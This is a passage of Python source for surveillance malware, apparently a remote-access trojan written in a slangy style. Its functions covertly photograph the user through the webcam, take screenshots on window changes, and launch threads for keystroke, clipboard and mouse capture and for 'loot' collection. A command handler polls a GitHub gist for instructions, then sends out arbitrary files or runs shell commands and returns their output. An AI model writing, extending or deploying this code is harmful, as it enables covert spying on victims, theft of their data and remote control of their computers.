        SELFIE_IN_PROGRESS = False

def sneaky_selfie_play():
    global GRAB_SELFIE_FIRST
    if GRAB_SELFIE_FIRST:
        log_shit("selfie: first hit")
        finesse_selfie()
        GRAB_SELFIE_FIRST = False
    else:
        while not stop_da_ops.is_set():
            time.sleep(random.uniform(4, 6))
            with hustle_lock:
                if time.time() - TIMESTAMPS["last_selfie"] >= 5 and cam_in_play and not SELFIE_IN_PROGRESS:
                    log_shit("selfie: cam in play, snappin'")
                    finesse_selfie()

def snap_screen(trigger=""):
    with hustle_lock:
        if time.time() - TIMESTAMPS["last_screenshot"] < 5:
            log_shit("screenshot: hold up - cooldown (trigger: %s)", trigger)
            return
        file_path = grab_snap(snatch_screen_file, "screenshot")
        if file_path:
            juggthiscracka(file_path=file_path)
            log_shit("screenshot: popped by %s", trigger)

def window_peep():
    global last_window
    while not stop_da_ops.is_set():
        time.sleep(0.5)
        current_window = peep_window()
        if current_window != last_window and time.time() - TIMESTAMPS["last_window_peep"] >= 0.5 and time.time() - TIMESTAMPS["last_screenshot"] >= 5:
            snap_screen(f"Window switched to {current_window}")
            last_window = current_window
            TIMESTAMPS["last_window_peep"] = time.time()

# Console
def console_watch():
    if not TEST_MODE:
        return
    log_shit("console watch on")
    while not stop_da_ops.is_set():
        time.sleep(0.5)
        cmd = input("Drop command: ").strip()
        if cmd == "/exit":
            stop_da_ops.set()
            wipe_old_ops()
            if CAMERA:
                CAMERA.release()
            os._exit(0)
        elif cmd == "/screenshot":
            snap_screen("Manual hit")
        elif cmd == "/selfie":
            finesse_selfie()

# Main
def start_play(target, name):
    thread = threading.Thread(target=target, daemon=True, name=name)
    thread.start()
    log_shit("play started: %s", name)

def main_hustle():
    global TIMESTAMPS
    TIMESTAMPS["last_screenshot"] = time.time() - 5
    TIMESTAMPS["last_selfie"] = time.time() - 5
    sys.excepthook = lambda t, v, tb: log_shit("big fuckup: %s", v, exc_info=(t, v, tb)) or sys.__excepthook__(t, v, tb)
    sys.stdout.write(f"[{datetime.now()}] v{VERSION} - hustle on (admin: {IS_ADMIN})\n")
    start_play(warm_cam, "warm_cam")
    run_da_crew()
    stay_low()
    fake_da_ops()
    run_loot(True)
    handler = CommandFinesse()
    plays = {
        "watch_da_keys": watch_da_keys,
        "periodic_loot": periodic_loot,
        "check_cam_play": check_cam_play,
        "sneaky_selfie_play": sneaky_selfie_play,
        "snatchdatloot": snatchdatloot,
        "handle_offline_stash": handle_offline_stash,
        "snatch_clip": snatch_clip,
        "window_peep": window_peep,
        "console_watch": console_watch,
        "watch_da_mouse": watch_da_mouse
    }
    for name, target in plays.items():
        start_play(target, name)
    while not stop_da_ops.is_set():
        if time.time() - TIMESTAMPS["last_cmd_grab"] > random.uniform(8, 12):
            handler.grab_cmds()
            TIMESTAMPS["last_cmd_grab"] = time.time()
        time.sleep(0.5)

class CommandFinesse:
    def __init__(self):
        self.executed = set()
        self.last_cmds = ""

    def grab_cmds(self):
        for attempt in range(3):
            try:
                resp = session.get("https://gist.github.com/jonhardwick-spec/6b171df6eacfad03119b1e1a98f85192/raw", timeout=3)
                if resp.text != self.last_cmds:
                    self.executed.clear()
                    self.parse_cmds(resp.text)
                    self.last_cmds = resp.text
                break
            except Exception as e:
                log_shit("grab_cmds fucked: %s, attempt %d", e, attempt + 1)
                time.sleep(2 ** attempt)

    def parse_cmds(self, data):
        if not data or data.isspace():
            return
        try:
            cmds = json.loads(data)
        except json.JSONDecodeError:
            cmds = data.strip().split('\n')
        for cmd in cmds:
            if isinstance(cmd, dict):
                action = cmd.get("action")
                param = cmd.get("path") or cmd.get("command")
            else:
                action = cmd.strip()
                param = None
            if action and action not in self.executed:
                self.executed.add(action)
                if action == "exfiltrate" and param and os.path.exists(param):
                    juggthiscracka(file_path=param)
                elif action == "execute" and param:
                    output = exec_with_timeout(param, shell=True) or "play fucked"
                    juggthiscracka(output)
                elif action == "/selfie":
                    finesse_selfie()
                elif action == "/screenshot":
                    snap_screen("Manual hit")
                elif action == "/juggthatmf":
                    pass

if __name__ == "__main__":
    try:
        main_hustle()
    except Exception as e:
        log_shit("main hustle fucked: %s", e, exc_info=sys.exc_info())
        stop_da_ops.set()
        if CAMERA:
            CAMERA.release()
        os._exit(1)